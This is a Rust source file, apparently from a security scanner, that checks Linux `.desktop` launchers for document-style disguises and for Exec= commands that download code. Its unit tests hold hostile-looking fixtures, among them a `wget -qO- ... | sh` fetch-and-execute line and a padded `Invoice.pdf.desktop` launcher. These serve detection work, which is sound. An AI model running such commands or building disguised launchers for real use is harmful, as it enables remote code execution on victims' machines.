//! Freedesktop launchers (DS-09). A `.desktop` file runs its `Exec=` command
//! when opened, whatever its file name, `Name=` and icon suggest. The same rules
//! apply to a launcher on disk and to one listed inside an archive.
use crate::{
    checks::shell,
    model::{Report, Severity, SkipReason},
    store::{digest, read_file, Store, MAX_INPUT},
};
use anyhow::Result;
use std::{os::unix::fs::PermissionsExt, path::Path};

/// How much of a launcher inside an archive is kept for these rules; a larger
/// one is judged as `UNREAD`.
pub const MAX_LAUNCHER: u64 = 64 * 1024;
/// Stands in for a launcher too large to read: padding does not make a launcher
/// any less able to run, so it is still judged as one.
pub const UNREAD: &str = "[Desktop Entry]\nExec=(not read)\n";

/// Extensions a launcher's name can borrow to pass for something other than a program.
const DOCUMENT: &[&str] = &[
    "pdf", "doc", "docx", "odt", "rtf", "txt", "md", "xls", "xlsx", "ods", "csv", "ppt", "pptx",
    "odp", "html", "htm", "jpg", "jpeg", "png", "gif", "webp", "svg", "mp3", "mp4", "mkv", "zip",
    "rar", "7z", "iso",
];

/// The first meaningful line of a launcher is its group header.
pub fn looks_like_launcher(head: &[u8]) -> bool {
    String::from_utf8_lossy(head)
        .trim_start_matches('\u{feff}')
        .lines()
        .map(str::trim)
        .find(|l| !l.is_empty() && !l.starts_with('#'))
        == Some("[Desktop Entry]")
}

/// A launcher file given to Inspect.
pub fn launcher(store: &Store, path: &Path) -> Result<Report> {
    let mut r = Report::new("Launcher check", path.display());
    let text = match read_file(path, MAX_INPUT) {
        Ok(bytes) => {
            r.sha256 = Some(digest(&bytes));
            String::from_utf8_lossy(&bytes).into_owned()
        }
        Err(_)
            if std::fs::symlink_metadata(path)
                .is_ok_and(|m| m.is_file() && m.len() > MAX_INPUT) =>
        {
            r.sha256 = Some(crate::checks::archive::file_digest(path)?);
            r.coverage.skip(
                "Launcher text",
                SkipReason::LimitReached,
                format!("Larger than {MAX_INPUT} bytes, so not read; judged as a launcher whose command is unknown"),
            );
            UNREAD.to_string()
        }
        Err(e) => return Err(e),
    };
    let executable = std::fs::metadata(path).is_ok_and(|m| m.permissions().mode() & 0o111 != 0);
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    if !assess(
        &mut r,
        &path.display().to_string(),
        &name,
        &text,
        executable,
    ) {
        r.errors
            .push("No [Desktop Entry] group; this is not a launcher.".into());
    }
    r.coverage.checked("Launcher fields");
    r.coverage.push(notes().into());
    r.details = crate::model::clean(text.trim_end());
    store.save(&r)?;
    Ok(r)
}

pub fn notes() -> &'static str {
    "Reads the launcher as text; nothing is run. The command's capabilities come from the installer rules, so a launcher that runs a downloaded or decoded program is reported as such without fetching anything. Whether a file manager opens it without asking depends on the file's executable bit and the desktop's own trust setting, which is not read."
}

/// The fields that decide what a launcher does and how it looks.
#[derive(Default)]
struct Entry {
    kind: String,
    names: Vec<String>,
    exec: String,
    url: String,
    icon: String,
}

fn parse(text: &str) -> Option<Entry> {
    let mut e = Entry::default();
    let mut in_entry = false;
    let mut found = false;
    for line in text.trim_start_matches('\u{feff}').lines() {
        let line = line.trim();
        if line.starts_with('[') {
            in_entry = line == "[Desktop Entry]";
            found |= in_entry;
            continue;
        }
        let Some((key, value)) = line.split_once('=').filter(|_| in_entry) else {
            continue;
        };
        let value = unescape(value.trim());
        match key.trim() {
            "Type" => e.kind = value,
            "Exec" => e.exec = value,
            "URL" => e.url = value,
            "Icon" => e.icon = value,
            k if k == "Name" || k.starts_with("Name[") => e.names.push(value),
            _ => {}
        }
    }
    found.then_some(e)
}

/// The desktop entry spec's string escapes.
fn unescape(value: &str) -> String {
    let mut out = String::new();
    let mut chars = value.chars();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('s') => out.push(' '),
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some(other) => out.push(other),
            None => out.push('\\'),
        }
    }
    out
}

/// `Exec=` without its field codes (`%f`, `%U`, ...), which the launcher fills in.
fn command(exec: &str) -> String {
    let mut out = String::new();
    let mut chars = exec.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '%' {
            match chars.next() {
                Some('%') => out.push('%'),
                _ => continue,
            }
        } else {
            out.push(c);
        }
    }
    out.trim().to_string()
}

fn borrowed_extension(name: &str) -> Option<&'static str> {
    let (_, ext) = name.trim().rsplit_once('.')?;
    let ext = ext.to_ascii_lowercase();
    DOCUMENT.iter().copied().find(|d| *d == ext)
}

/// Icon names from the freedesktop MIME-type icons (application-pdf,
/// x-office-document, folder, ...) or a file named after a document type.
fn document_icon(icon: &str) -> bool {
    let base = icon.rsplit('/').next().unwrap_or(icon).to_ascii_lowercase();
    let base = base
        .strip_suffix(".png")
        .or_else(|| base.strip_suffix(".svg"))
        .unwrap_or(&base);
    if matches!(
        base,
        "application-x-executable" | "application-x-shellscript"
    ) {
        return false;
    }
    [
        "application-",
        "text-",
        "image-",
        "audio-",
        "video-",
        "x-office-",
        "folder",
        "inode-",
        "package-x-generic",
    ]
    .iter()
    .any(|p| base.starts_with(p))
        || base.contains("pdf")
}

/// Adds the launcher findings for one `.desktop` file. `location` is where it
/// is (a path, or "archive: entry"); `file_name` is the name a file manager would
/// show before trusting it. False when the text has no `[Desktop Entry]` group.
pub fn assess(
    r: &mut Report,
    location: &str,
    file_name: &str,
    text: &str,
    executable: bool,
) -> bool {
    let Some(entry) = parse(text) else {
        return false;
    };
    let runs = match entry.kind.as_str() {
        "Link" => format!("Opens: {}", entry.url),
        "Directory" => return true,
        _ => format!("Runs: {}", command(&entry.exec)),
    };
    let shown = entry.names.first().cloned().unwrap_or_default();
    let mut evidence = format!("{location}\nName: {shown}\n{runs}");
    if executable {
        evidence.push_str(
            "\nIt is marked executable, so a file manager may run it without asking first.",
        );
    }
    let stem = file_name
        .strip_suffix(".desktop")
        .or_else(|| file_name.strip_suffix(".DESKTOP"))
        .unwrap_or(file_name);
    let mut disguise = vec![];
    if let Some(ext) = borrowed_extension(stem) {
        disguise.push(format!("its file name ends in .{ext}.desktop"));
    }
    if let Some((name, ext)) = entry
        .names
        .iter()
        .find_map(|n| borrowed_extension(n).map(|e| (n, e)))
    {
        disguise.push(format!("it calls itself \"{name}\", a .{ext} name"));
    }
    if document_icon(&entry.icon) {
        disguise.push(format!("it uses the {} icon", entry.icon));
    }
    let mut added = false;
    if !disguise.is_empty() {
        r.add(
            "desktop.masquerade",
            Severity::High,
            &format!("{file_name} is a program launcher made to look like a file"),
            format!("{evidence}\nLooks like a file because {}.", disguise.join(" and ")),
            "Do not open it. A real document does not end in .desktop. Delete it unless you know who made it and why.",
        );
        added = true;
    }
    if entry.kind != "Link" {
        let scan = shell::analyze_content(&command(&entry.exec));
        let downloads = scan
            .findings
            .iter()
            .any(|f| f.rule == "shell.download" || f.rule == "shell.execute-download");
        if downloads {
            r.add(
                "desktop.exec-download",
                Severity::High,
                &format!("{file_name} downloads something when opened"),
                &evidence,
                "Do not open it. What it downloads is not part of this check and can change at any time.",
            );
            added = true;
        }
        for mut f in scan.findings.into_iter().filter(|f| {
            !downloads || (f.rule != "shell.download" && f.rule != "shell.execute-download")
        }) {
            f.evidence = format!(
                "{location}: {}",
                f.evidence.replacen("Line 1: ", "Exec: ", 1)
            );
            r.findings.push(f);
        }
    }
    if !added {
        r.add(
            "desktop.launcher",
            Severity::Review,
            &format!("{file_name} is a program launcher, not a document"),
            &evidence,
            "Opening it runs the command shown. Open it only if you expected a program from this source.",
        );
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(name: &str, text: &str) -> Vec<String> {
        let mut r = Report::new("t", "t");
        assert!(assess(&mut r, name, name, text, false));
        r.findings.into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn a_launcher_padded_past_the_archive_limit_is_still_read() {
        let d = tempfile::tempdir().unwrap();
        let store = Store::open(Some(d.path().join("s"))).unwrap();
        let path = d.path().join("Invoice.pdf.desktop");
        let padding = "# padding\n".repeat(7 * 1024);
        std::fs::write(
            &path,
            format!("[Desktop Entry]\n{padding}Type=Application\nExec=sh -c \"echo test\"\n"),
        )
        .unwrap();
        let r = launcher(&store, &path).unwrap();
        assert!(r.findings.iter().any(|f| f.rule == "desktop.masquerade"));
        assert!(!r.is_incomplete());
    }

    #[test]
    fn a_document_name_or_icon_is_a_disguise() {
        let base = "[Desktop Entry]\nType=Application\nExec=sh -c \"echo test\"\n";
        assert_eq!(rules("invoice.pdf.desktop", base), ["desktop.masquerade"]);
        assert_eq!(
            rules("notes.desktop", &format!("{base}Icon=application-pdf\n")),
            ["desktop.masquerade"]
        );
        assert_eq!(
            rules("notes.desktop", &format!("{base}Name=Q3 report.docx\n")),
            ["desktop.masquerade"]
        );
        assert_eq!(
            rules(
                "tool.desktop",
                &format!("{base}Icon=application-x-executable\n")
            ),
            ["desktop.launcher"]
        );
    }

    #[test]
    fn field_codes_and_escapes_do_not_hide_the_command() {
        let text = "[Desktop Entry]\nExec=sh -c \"cu\\rl\" %U\nExec=sh\\s-c 'wget -qO- https://example.invalid/x | sh' %f\n";
        let mut r = Report::new("t", "t");
        assess(&mut r, "a.desktop", "a.desktop", text, false);
        assert_eq!(r.findings[0].rule, "desktop.exec-download");
        assert!(r.findings[0]
            .evidence
            .contains("Runs: sh -c 'wget -qO- https://example.invalid/x | sh'"));
    }

    #[test]
    fn other_groups_and_non_launchers_are_ignored() {
        let mut r = Report::new("t", "t");
        assert!(!assess(&mut r, "x", "x", "Exec=curl x\n", false));
        let text = "[Desktop Entry]\nType=Application\nExec=gedit %F\n[Desktop Action new]\nExec=curl https://example.invalid\n";
        assert_eq!(rules("gedit.desktop", text), ["desktop.launcher"]);
        assert!(looks_like_launcher(b"# made by hand\n\n[Desktop Entry]\n"));
        assert!(!looks_like_launcher(b"#!/bin/sh\n"));
    }
}
